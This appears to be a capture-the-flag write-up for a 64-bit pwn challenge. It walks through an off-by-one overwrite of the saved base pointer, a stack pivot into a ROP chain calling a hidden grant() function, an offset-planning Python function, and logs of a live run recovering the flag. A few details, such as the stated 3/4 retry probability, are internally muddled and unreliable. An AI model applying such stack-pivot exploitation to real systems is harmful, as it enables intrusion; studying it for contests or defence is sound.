# Maintenance Log - Pwn (150 points)

**Flag:** `CSSCTF{Duh_m4t3_1_4m_sl33py}`
**Attached file:** `chall` (Size: 14,480 B, SHA256: `de630ba8...b118e3`), `Dockerfile`, `flag.txt`
**Network service:** `nc 34.116.80.78 7312`

## Problem Description

The system establishes a console interface (terminal) simulating a maintenance procedure, displaying a welcome banner line and requesting two info fields: Summary of the report content (summary) and personnel tag identifier (tag). In the description, the service provider asserts the system is "fortified with a stack canary structure, guaranteeing absolute safety against forms of memory corruption exploitation". Even so, in the main operational flow, the interface verbatim outputs a memory address alongside the message `IS LEAKING`. The ultimate objective is to gain "administrative clearance" by redirecting code execution into the authorization command block, thereby retrieving the content of the `flag.txt` file residing on the server.

## Initial Analysis

Checking the `chall` file: 64-bit ELF format with `Type: EXEC` classification, proving the Position Independent Executable (PIE) address space randomization feature is completely disabled (no-PIE). Thanks to this, all code instruction address structures are static and fixed, allowing the establishment of a Return-Oriented Programming (ROP) chain without requiring a memory leak to find code addresses. The No-eXecute (NX) mechanism is activated, the RELRO feature is enabled at a partial level (partial RELRO), and the binary has been stripped. Conducting a scan of the `.text` block structure yielded crucial source code regions (gadgets) playing pivotal roles (Note: the two addresses `0x40124d` and `0x40124f` do not belong to independent function classifications, but are gadget segments appearing due to the compiler inserting padding between function blocks):

| Address | Technical Role | Canary Status |
| --- | --- | --- |
| `0x4011b6` | Configuration function `io_setup()`: Executes `setvbuf(stdin/stdout/stderr, _IONBF)` | Protected |
| `0x401268` | Authorization dispatcher function `grant(int, int)` - **Dead code**, no mechanism in the main flow makes the call. | Protected |
| `0x40124d` | Gadget `pop rdi; ret` (Hidden in function block padding) | N/A |
| `0x40124f` | Gadget `pop rsi; ret` | N/A |
| `0x401348` | Navigator execution function `operator()` | Unprotected |
| `0x40139a` | Report output function `report()` | Unprotected |

The `grant(edi, esi)` function applies a check on two static variables: `edi == 0xdeadbeef` and `esi == 0xcafebabe`. If the parameters are valid, the instruction block processes consecutive calls including `fopen("flag.txt")`, `fgets`, `puts` and terminates the process with `exit(0)`. Otherwise, it outputs an authentication error warning message `[-] Authentication token mismatch.`. The `grant` function acts as the security "perimeter" that must be seized, as it holds exclusive access to the `flag.txt` file structure.

Statistics indicate that the system only imposes the canary defense mechanism (vendor's principle) on 3 functions: `io_setup`, `grant`, and `main`. However, even if this mechanism appears in the `main` function, it still loses its effect because the workload is directly delegated to the `exit` instruction belonging to the `grant` function before the check mechanism is deployed. Most critically, both the `report()` and `operator()` functions have absolutely no stack canary protection mechanism. Furthermore, the `report()` function publicly leaked the buffer address structure:

```assembly
0x4013b8: lea rax,[rbp-0x50]; mov rsi,rax
0x4013bf: lea rax,[rip+0xcd2]   # Outputs: "[*] Report buffer allocated at: %p"
```

This `Report buffer` data is the very leak stream mentioned in the problem description. Further analysis reveals the `report()` function executes the call `read(0, rbp-0x50, 0x50)` - the read size limit (0x50) is safely synchronized against the buffer size, causing no buffer overflow. Next, the process activates the auxiliary function `operator()` bearing the following flawed directives:

```assembly
0x401350: memset(rbp-0x20, 0, 0x20)
0x40137a: mov QWORD PTR [rbp-0x28], 0x21
0x401392: read(0, rbp-0x20, 0x21)     # Executes reading 33 bytes for a 32-byte designed buffer
```

The focal vulnerability lies in the last instruction: A single surplus byte error (Off-by-one). At the 33rd byte, the excess data will drop directly and overwrite the slot containing the Base Pointer frame address (saved rbp).

## Exploitation Chain

**Step 1 - Map the stack memory layout (Stack layout).** 
Set the variable `X = rbp_main`, mapped in exact accordance with the prologue and epilogue sequence:

```text
From X-0xA0 to X-0x81 : 32-byte buffer block belonging to the operator() function (Allows customizing content)
Mark X-0x80           : Storage location of operator()'s saved rbp, holds value X-0x20 <- Where the Off-by-one vulnerable LSB interferes
Mark X-0x78           : Return address of the report() function (0x401407), out of manipulation range
From X-0x70 to X-0x21 : 80-byte buffer block belonging to the report() function (Allows customizing content holding the ROP chain, designated P = X-0x70)
Mark X-0x20           : Storage location of report()'s saved rbp, holds value X
Mark X-0x18           : Return address redirecting into the main function (0x401453)
```

**Step 2 - Form the branching tool from the 1-byte vulnerability (Primitive extraction).** 
After the `operator()` function finishes processing, the `report()` block will output the processing report `[*] Processing report...` and automatically execute the command sequence to clean up and terminate the function structure (`leave; ret`). At this point in time, the value of the base register `rbp_report` has been erroneously modified to `(X-0x20) & ~0xFF | z`, where the variable `z` is exactly the surplus byte value (the 33rd byte) transmitted up from the exploit code. The state diagram at that time:

```text
leave instruction  -> System sets register rsp = B + z (With B = (X-0x20) & ~0xFF, retaining stability of the upper 8 bytes)
pop rbp instruction-> Updated state: rsp = B + z + 8
ret instruction    -> Sets execution point: rip = qword[B + z + 8]
```

With `z` randomly fluctuating within a spectrum range of 256 values, the exploit script is granted the power to decide the destination of the `ret` instruction (taking the address for the `rip` instruction), via a memory window frame 256 bytes in size surrounding the `X-0x20` threshold. At this moment, the leak data of parameter `P` has been obtained, the script calculates `X = P + 0x70` and immediately shapes the value `B`. There is no arising need to scan for any other leak data, and the 256-byte window sweeping across is perfectly compatible, coinciding with the 80-byte buffer block located inside the `report()` function, where the ROP structure has been pre-ambushed.

**Step 3 - Configure the buffer call constraint.** 
A successful privilege escalation ROP chain needs to assemble 5 value regions (total capacity 40 bytes):

```text
Mark +0   Instruction pop rdi; ret (0x40124d)     Mark +8   Initialize parameter 0xdeadbeef
Mark +16  Instruction pop rsi; ret (0x40124f)     Mark +24  Initialize parameter 0xcafebabe
Mark +32  Execute grant()  (0x401268)
```

Assuming the ROP segment is structured starting at offset position `O` inside the memory buffer, the deductive connection equation is `A = P + O = B + z + 8`, deriving the variable `z = O + L - 88` (with the coefficient `L = (X-0x20) & 0xFF`). The system must satisfy 3 certain strict constraints:
1. The value `z` must fall within the encoded range `[0, 255]`, requiring `O >= 88 - L`.
2. The offset size `O <= 40` to avoid a buffer boundary overflow situation.
3. The parameter `O` must absolutely be a common divisor that is a multiple of 16, ensuring the register `rsp % 16 == 8` (According to the SysV AMD64 function convention, an extremely important factor because the glibc 2.39 library function applied inside `fopen` and `fgets` always triggers a check on the address alignment of the SSE vector instruction set).
Since the constant `X` always has the property of being a multiple of 16, while the coefficient `L` carries a chaotic factor due to the 8 lowest bits (due to ASLR randomization), the values `L ∈ {0, 16, 32, 48}` will lead to an unresolvable equation situation (no compatible parameter `O` found). For this case, the process of restarting the request (to receive a new stack frame) has an approximate probability of 3/4. 

```python
def plan(leak_p):
    x = leak_p + 0x70
    b = (x - 0x20) & ~0xFF
    for off in (0, 16, 32):
        z = leak_p + off - 8 - b
        if 0 <= z <= 0xFF:
            return off, z          # Output parameter `z` denoting the identifier of the 33rd error byte sent to the operator() function
    return None
```

**Step 4 - Offline Testing (Dry run) prior to exploitation.** 
The `analysis/selftest.py` tool launches a simulated network (fake socket) integrated with a flat set memory region. This code suite sequentially simulates the basic interaction process (push rbp, leave, pop rbp, ret) relying entirely on actual disassembled machine code and uses the interpolation algorithm (`plan`, `payload`, `attempt`) synchronized with the core `exploit.py` file. Run a random scan of 16 values of `X mod 256`:

```text
[*] Simulation statistics: success=12, plan_skipped=4, fail=0
[*] Run control (Without ROP integration): result='rip=0x4141414141414141' flag=None
[*] Run control (Value z with 1-byte error): result='rip=0xef00000000004012'
[+] The selftest process successfully bypassed the barrier (OK)
```

12 versions generated read permissions for the flag file; 4 cases where the system detected an eccentric factor `L < 56` and were correctly rejected (self-proving the simulation frame is not self-deceiving). Both the "non-ROP supported" and "1-byte deviation" sample configurations caused the system to crash (fail) exactly as expected, verifying the accuracy of the harness in confirming whether the system actually activated and branched precisely as intended. It was this automated simulation mechanism that played the role of detecting an issue from the analyst's 3rd research version: The initial model misread the return instruction with the parameter `qword[rbp]` instead of the parameter `qword[rbp+8]` (missing the rbp restore step). That error caused a state output of `rip=0`. After modifying the configuration, all 12/16 situations successfully simulated.

**Step 5 - Exploit and penetrate the target system.** 
Interaction loop: Maintain connection, allocate a standalone thread; read coordinates (leak), send an 80-byte payload containing the ROP structure; push the 33-byte error payload interfering with authorization, then wait to collect the server response.

```text
[*] Scan round 1/8 -> Server: 34.116.80.78 Port: 7312
[*] Value P = 0x7ffdd96ba300 (P%16=0) -> Parameter offset=16 z=0x8 Allocation rip<-[0x7ffdd96ba310]
[*] Response data:
[*] Processing report...
[+] Access Granted! Here is your flag:
CSSCTF{Duh_m4t3_1_4m_sl33py}
[+] Flag successfully extracted: CSSCTF{Duh_m4t3_1_4m_sl33py}
```

Check the cycle with a 2nd connection to validate the reliability of the `plan` algorithm (checking the self-adaptive property to memory address structures).

```text
[*] Scan round 1/8 -> Server: 34.116.80.78 Port: 7312
[*] Value P = 0x7ffda1427b30 (P%16=0) -> Parameter offset=0 z=0x28 Allocation rip<-[0x7ffda1427b30]
[+] Flag successfully extracted: CSSCTF{Duh_m4t3_1_4m_sl33py}
```

Round 2 processed with parameter `offset=0`, while round 1 applied parameter `offset=16`. This result affirms the self-calculating `plan()` function has the capability to flexibly stream and automatically calibrate coordinates for each session. The data received is starkly different from the draft content `CSSCTF{definetely_not_flag}`, certifying this is the system's actual structure, not a local attached file.

## Flag

Result:
```text
CSSCTF{Duh_m4t3_1_4m_sl33py}
```

## Reproduce

Automated re-establishment process using script:

```bash
python exploit.py                    # Proceed to execute attack on the server (Static IP, self-adjusting offset parameter)
python exploit.py <host> <port> 8    # Execute according to open parameters: host/port/max_connection_cycles config
python exploit.py --probe            # Transmit test payload mode, verify network pipe flow mechanism
python analysis/selftest.py          # Deploy offline emulator, test frame stack coordinate system output
```


